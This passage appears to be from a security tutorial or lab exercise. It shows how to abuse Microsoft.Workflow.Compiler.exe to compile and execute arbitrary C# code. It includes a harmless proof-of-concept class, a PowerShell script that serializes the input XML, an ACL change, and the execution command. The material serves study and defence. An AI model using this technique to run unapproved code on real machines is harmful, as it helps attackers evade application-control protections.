file containing code we provide must contain a class that inherits from the Activity class of the System.Workflow.ComponentModel namespace and must contain the code we want to execute inside its constructor.

Proof of concept code as input file- test.txt

    using System;
    using System.Workflow.ComponentModel;
    public class Run : Activity{
        public Run() {
            Console.WriteLine("I executed!");
        }
    }

we need to create a valid input file in XML format that will be processed by Microsoft.Workflow.Compiler and used to compile and load our C# code

Powershell Script:

    $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
    $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
    $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
    Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
    $compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
    $compilerparam.GenerateInMemory = $True
    $pathvar = "test.txt"
    $output = "C:\run.xml"
    $tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
    Move-Item $tmp $output

Verify Contents of serialized XML file generated by SerializeInputToWrapper

    cmd> type C:\run.xml

we need to ensure the student is able to access the generated file:

    PS C:\> $Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“username”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl

Executing the proof of concept:

    cmd> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml

The downside to this attack is that we must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
    
